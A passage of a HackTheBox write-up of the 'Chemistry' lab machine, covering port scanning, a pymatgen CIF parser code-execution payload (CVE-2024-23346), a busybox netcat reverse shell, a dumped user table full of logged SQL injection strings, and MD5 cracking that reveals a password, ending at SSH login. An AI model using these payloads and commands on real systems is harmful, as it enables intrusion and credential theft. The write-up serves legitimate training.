---
title: Chemistry HackTheBox
author: pylon
date: 2025-05-11 14:10:00 +0800
categories: [Writeups ,HackTheBox]
tags: [HackTheBox, Linux]
image: /assets/images/hackthebox/chemistry/logo.png
description: Chemistry is an easy machine where we will find in the port 5000 a service of chemical tables with the extension .cif where thanks to the CVE-2024-23346 we will achieve a command execution becoming the pink user. In the machine has open locally the port 8080 where it hides an aiohttp service where we will achieve a LFI.
render_with_liquid: false
---

# Enumeration

We start with an nmap scan:

```bash
# Nmap 7.94SVN scan initiated Sun Oct 20 09:44:13 2024 as: nmap -p- --open -sCVS -vvv -n -Pn -oN target 10.10.11.38
Nmap scan report for 10.10.11.38
Host is up, received user-set (0.044s latency).
Scanned at 2024-10-20 09:44:13 CEST for 118s
Not shown: 64707 closed tcp ports (reset), 825 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sun, 20 Oct 2024 07:44:39 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=10/20%Time=6714B4E8%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
SF:\x20Python/3\.9\.5\r\nDate:\x20Sun,\x2020\x20Oct\x202024\x2007:44:39\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemi
SF:stry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class
SF:=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\"
SF:>Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
SF:contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center
SF:><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">R
SF:egister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\
SF:x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20
SF:version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Er
SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 20 09:46:11 2024 -- 1 IP address (1 host up) scanned in 118.55 seconds
```

Let's go to port 5000 in our browser:

![](/assets/images/hackthebox/chemistry/1.png)

We have the possibility to login or register, in the login probe credentials like `admin:admin` `admin:admin123` and they were not valid, so we will create an account:

![](/assets/images/hackthebox/chemistry/2.png)

We will be able to see that it gives us an example of a .cif file so we will download it and we will see the content:

```bash
❯ wget http://10.10.11.38:5000/static/example.cif
--2024-10-20 09:58:02--  http://10.10.11.38:5000/static/example.cif
Connecting to 10.10.11.38:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 376 [chemical/x-cif]
Saving to: ‘example.cif’

example.cif                                    100%[==================================================================================================>]     376  --.-KB/s    in 0,01s   

2024-10-20 09:58:02 (37,0 KB/s) - ‘example.cif’ saved [376/376]
```

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

If we upload it to the web we can see that it gives us a table with the data:

![](/assets/images/hackthebox/chemistry/3.png)

# Foothold

Searching a bit on Google I found this:

- [https://github.com/advisories/GHSA-vgv8-5cpj-qj2f](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f)

We are going to use that `.cif` that you share in the PoC and we are going to make it send us a curl request to our python3 server:

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl YOURIP:PORT");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

```bash
❯ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

Now we are going to send that `.cif` with that content and we will click on the view button and we will see that we get the request!

```bash
❯ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.11.38 - - [20/Oct/2024 10:18:09] "GET / HTTP/1.1" 200 -
```

![](/assets/images/hackthebox/chemistry/pepolike.png)

Once this command execution is confirmed, we will send us a reverse shell:

`.cif` file:

```bash
busybox nc YOURIP 9001 -e sh
```

We will upload the `.cif` file and hit `view` and we will receive the reverse shell:

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.16.37] from (UNKNOWN) [10.10.11.38] 46508
whoami
app
```

We will see that we are the user app if we see the `/etc/passwd` we can see that there is another user named `rosa`:

```bash
app@chemistry:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

If we do an `ls` in the home of the app user we can see a folder called `instance`, if we access it we can see a `database.db`:

```bash
app@chemistry:~/instance$ ls
database.db
```

We will access with `sqlite3` indicating the `database.db` file and we will do a `.tables` to see which tables we have and we will be able to identify the `user` table:

```bash
app@chemistry:~/instance$ sqlite3 database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
structure  user   
```

Let's select it to see its contents:
```sql
sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|aaa|47bce5c74f589f4867dbd57e9ca9f808
16|test|098f6bcd4621d373cade4e832627b4f6
17|tomi|08767d10c94125f26f95eaadb5ebb98a
18|cheuse|ba52919d1cbf1d3461725ee600f41185
19|superuser|202cb962ac59075b964b07152d234b70
20|fxhacker|9641786d195face891ae78f975d58c4d
21|asd|7815696ecbf1c96e6894b779456d330e
22|asdasd|a8f5f167f44f4964e6c998dee827110c
23|fxhacker(,.,(),'",|9641786d195face891ae78f975d58c4d
24|fxhacker'TZRFGn<'">pgHRdm|9641786d195face891ae78f975d58c4d
25|fxhacker') AND 8818=1222 AND ('nvGm'='nvGm|9641786d195face891ae78f975d58c4d
26|fxhacker') AND 1860=1860 AND ('SUww'='SUww|9641786d195face891ae78f975d58c4d
27|fxhacker' AND 7793=7697 AND 'fLrI'='fLrI|9641786d195face891ae78f975d58c4d
28|fxhacker' AND 1860=1860 AND 'jUuW'='jUuW|9641786d195face891ae78f975d58c4d
29|fxhacker) AND 5992=4424 AND (5248=5248|9641786d195face891ae78f975d58c4d
30|fxhacker) AND 1860=1860 AND (6524=6524|9641786d195face891ae78f975d58c4d
31|fxhacker AND 1654=4654|9641786d195face891ae78f975d58c4d
32|fxhacker AND 1860=1860|9641786d195face891ae78f975d58c4d
33|fxhacker AND 7156=5210-- INVz|9641786d195face891ae78f975d58c4d
34|fxhacker AND 1860=1860-- oWvz|9641786d195face891ae78f975d58c4d
35|(SELECT (CASE WHEN (4198=4095) THEN 'fxhacker' ELSE (SELECT 4095 UNION SELECT 3230) END))|9641786d195face891ae78f975d58c4d
36|(SELECT (CASE WHEN (6831=6831) THEN 'fxhacker' ELSE (SELECT 3392 UNION SELECT 6864) END))|9641786d195face891ae78f975d58c4d
37|fxhacker') AND EXTRACTVALUE(7803,CONCAT(0x5c,0x7178707a71,(SELECT (ELT(7803=7803,1))),0x717a7a7a71)) AND ('PuMv'='PuMv|9641786d195face891ae78f975d58c4d
38|fxhacker' AND EXTRACTVALUE(7803,CONCAT(0x5c,0x7178707a71,(SELECT (ELT(7803=7803,1))),0x717a7a7a71)) AND 'KuAc'='KuAc|9641786d195face891ae78f975d58c4d
39|fxhacker) AND EXTRACTVALUE(7803,CONCAT(0x5c,0x7178707a71,(SELECT (ELT(7803=7803,1))),0x717a7a7a71)) AND (3149=3149|9641786d195face891ae78f975d58c4d
40|fxhacker AND EXTRACTVALUE(7803,CONCAT(0x5c,0x7178707a71,(SELECT (ELT(7803=7803,1))),0x717a7a7a71))|9641786d195face891ae78f975d58c4d
41|fxhacker AND EXTRACTVALUE(7803,CONCAT(0x5c,0x7178707a71,(SELECT (ELT(7803=7803,1))),0x717a7a7a71))-- vWid|9641786d195face891ae78f975d58c4d
42|fxhacker') AND 3238=CAST((CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3238=3238) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)) AS NUMERIC) AND ('Vapd'='Vapd|9641786d195face891ae78f975d58c4d
43|fxhacker' AND 3238=CAST((CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3238=3238) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)) AS NUMERIC) AND 'onKg'='onKg|9641786d195face891ae78f975d58c4d
44|fxhacker) AND 3238=CAST((CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3238=3238) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)) AS NUMERIC) AND (9566=9566|9641786d195face891ae78f975d58c4d
45|fxhacker AND 3238=CAST((CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3238=3238) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)) AS NUMERIC)|9641786d195face891ae78f975d58c4d
46|fxhacker AND 3238=CAST((CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3238=3238) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)) AS NUMERIC)-- kLoB|9641786d195face891ae78f975d58c4d
47|fxhacker') AND 1491 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1491=1491) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113))) AND ('QptR'='QptR|9641786d195face891ae78f975d58c4d
48|fxhacker' AND 1491 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1491=1491) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113))) AND 'jbGn'='jbGn|9641786d195face891ae78f975d58c4d
49|fxhacker) AND 1491 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1491=1491) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113))) AND (8211=8211|9641786d195face891ae78f975d58c4d
50|fxhacker AND 1491 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1491=1491) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113)))|9641786d195face891ae78f975d58c4d
51|fxhacker AND 1491 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1491=1491) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113)))-- eFXq|9641786d195face891ae78f975d58c4d
52|fxhacker') AND 4546=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (4546=4546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL) AND ('vBSL'='vBSL|9641786d195face891ae78f975d58c4d
53|fxhacker' AND 4546=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (4546=4546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL) AND 'wJTg'='wJTg|9641786d195face891ae78f975d58c4d
54|fxhacker) AND 4546=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (4546=4546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL) AND (2344=2344|9641786d195face891ae78f975d58c4d
55|fxhacker AND 4546=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (4546=4546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL)|9641786d195face891ae78f975d58c4d
56|fxhacker AND 4546=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (4546=4546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL)-- riip|9641786d195face891ae78f975d58c4d
57|(SELECT CONCAT(CONCAT('qxpzq',(CASE WHEN (5701=5701) THEN '1' ELSE '0' END)),'qzzzq'))|9641786d195face891ae78f975d58c4d
58|fxhacker');SELECT PG_SLEEP(5)--|9641786d195face891ae78f975d58c4d
59|fxhacker';SELECT PG_SLEEP(5)--|9641786d195face891ae78f975d58c4d
60|fxhacker);SELECT PG_SLEEP(5)--|9641786d195face891ae78f975d58c4d
61|fxhacker;SELECT PG_SLEEP(5)--|9641786d195face891ae78f975d58c4d
62|fxhacker');WAITFOR DELAY '0:0:5'--|9641786d195face891ae78f975d58c4d
63|fxhacker';WAITFOR DELAY '0:0:5'--|9641786d195face891ae78f975d58c4d
64|fxhacker);WAITFOR DELAY '0:0:5'--|9641786d195face891ae78f975d58c4d
65|fxhacker;WAITFOR DELAY '0:0:5'--|9641786d195face891ae78f975d58c4d
66|fxhacker');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(82)||CHR(98)||CHR(109),5) FROM DUAL--|9641786d195face891ae78f975d58c4d
67|fxhacker';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(82)||CHR(98)||CHR(109),5) FROM DUAL--|9641786d195face891ae78f975d58c4d
68|fxhacker);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(82)||CHR(98)||CHR(109),5) FROM DUAL--|9641786d195face891ae78f975d58c4d
69|fxhacker;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(82)||CHR(98)||CHR(109),5) FROM DUAL--|9641786d195face891ae78f975d58c4d
70|fxhacker') AND (SELECT 6732 FROM (SELECT(SLEEP(5)))TbaJ) AND ('pakS'='pakS|9641786d195face891ae78f975d58c4d
71|fxhacker' AND (SELECT 6732 FROM (SELECT(SLEEP(5)))TbaJ) AND 'onrC'='onrC|9641786d195face891ae78f975d58c4d
72|fxhacker) AND (SELECT 6732 FROM (SELECT(SLEEP(5)))TbaJ) AND (7857=7857|9641786d195face891ae78f975d58c4d
73|fxhacker AND (SELECT 6732 FROM (SELECT(SLEEP(5)))TbaJ)|9641786d195face891ae78f975d58c4d
74|fxhacker AND (SELECT 6732 FROM (SELECT(SLEEP(5)))TbaJ)-- DzjU|9641786d195face891ae78f975d58c4d
75|fxhacker') AND 5293=(SELECT 5293 FROM PG_SLEEP(5)) AND ('pRxq'='pRxq|9641786d195face891ae78f975d58c4d
76|fxhacker' AND 5293=(SELECT 5293 FROM PG_SLEEP(5)) AND 'FQPn'='FQPn|9641786d195face891ae78f975d58c4d
77|fxhacker) AND 5293=(SELECT 5293 FROM PG_SLEEP(5)) AND (5799=5799|9641786d195face891ae78f975d58c4d
78|fxhacker AND 5293=(SELECT 5293 FROM PG_SLEEP(5))|9641786d195face891ae78f975d58c4d
79|fxhacker AND 5293=(SELECT 5293 FROM PG_SLEEP(5))-- JzOa|9641786d195face891ae78f975d58c4d
80|fxhacker') WAITFOR DELAY '0:0:5' AND ('EniQ'='EniQ|9641786d195face891ae78f975d58c4d
81|fxhacker' WAITFOR DELAY '0:0:5' AND 'sCcH'='sCcH|9641786d195face891ae78f975d58c4d
82|fxhacker) WAITFOR DELAY '0:0:5' AND (2420=2420|9641786d195face891ae78f975d58c4d
83|fxhacker WAITFOR DELAY '0:0:5'|9641786d195face891ae78f975d58c4d
84|fxhacker WAITFOR DELAY '0:0:5'-- yWOg|9641786d195face891ae78f975d58c4d
85|fxhacker') AND 8001=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(81)||CHR(68)||CHR(108),5) AND ('UrRR'='UrRR|9641786d195face891ae78f975d58c4d
86|fxhacker' AND 8001=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(81)||CHR(68)||CHR(108),5) AND 'pHQE'='pHQE|9641786d195face891ae78f975d58c4d
87|fxhacker) AND 8001=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(81)||CHR(68)||CHR(108),5) AND (1670=1670|9641786d195face891ae78f975d58c4d
88|fxhacker AND 8001=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(81)||CHR(68)||CHR(108),5)|9641786d195face891ae78f975d58c4d
89|fxhacker AND 8001=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(81)||CHR(68)||CHR(108),5)-- wWgv|9641786d195face891ae78f975d58c4d
90|fxhacker') ORDER BY 1-- syJp|9641786d195face891ae78f975d58c4d
91|fxhacker' ORDER BY 1-- VWHj|9641786d195face891ae78f975d58c4d
92|fxhacker) ORDER BY 1-- QXHX|9641786d195face891ae78f975d58c4d
93|fxhacker ORDER BY 1-- xRZU|9641786d195face891ae78f975d58c4d
94|fxhacker ORDER BY 1-- tmEa|9641786d195face891ae78f975d58c4d
95|root|63a9f0ea7bb98050796b649e85481845
96|asda|a8f5f167f44f4964e6c998dee827110c
97|pylon|8ef55d02bd174c29177d5618bfb3a2f3
98|teggass|fc0734cf5163a75c763e628b937c3e91
```

We will be able to see the `rosa` user credentials in **MD5**:

```sql
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
```

We will save that *MD5* in a file called `hash` and use `hashcat`:

```bash
❯ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #2: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             Falling back to OpenCL runtime.

* Device #2: This hardware has outdated CUDA compute capability (3.0).
             For modern OpenCL performance, upgrade to hardware that supports
             CUDA compute capability version 5.0 (Maxwell) or higher.
* Device #2: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetCurrPcieLinkWidth(): Not Supported

nvmlDeviceGetClockInfo(): Not Supported

nvmlDeviceGetClockInfo(): Not Supported

nvmlDeviceGetTemperatureThreshold(): Not Supported

nvmlDeviceGetTemperatureThreshold(): Not Supported

nvmlDeviceGetUtilizationRates(): Not Supported

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-ivybridge-Intel(R) Core(TM) i7-3770 CPU @ 3.40GHz, skipped

OpenCL API (OpenCL 3.0 CUDA 11.4.557) - Platform #2 [NVIDIA Corporation]
========================================================================
* Device #2: NVIDIA GeForce GT 630, 1344/1995 MB (498 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 8 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 63ed86ee9f624c7b14f1d4f43dc251a5
Time.Started.....: Mon Oct 21 15:48:58 2024 (2 secs)
Time.Estimated...: Mon Oct 21 15:49:00 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1848.4 kH/s (6.12ms) @ Accel:256 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2998272/14344385 (20.90%)
Rejected.........: 0/2998272 (0.00%)
Restore.Point....: 2981888/14344385 (20.79%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: unicornn -> ufcheer6
Hardware.Mon.#2..: Temp: 63c Fan: 44%

Started: Mon Oct 21 15:48:52 2024
Stopped: Mon Oct 21 15:49:00 2024
```

Now we will start by SSH as the user `rosa`:

```bash
❯ ssh rosa@10.10.11.38
rosa@10.10.11.38's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 21 Oct 2024 01:50:12 PM UTC

  System load:           0.0
  Usage of /:            84.0% of 5.08GB
  Memory usage:          28%
  Swap usage:            0%
  Processes:             253
  Users logged in:       2
  IPv4 address for eth0: 10.10.11.38
  IPv6 address for eth0: dead:beef::250:56ff:feb0:f8d1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

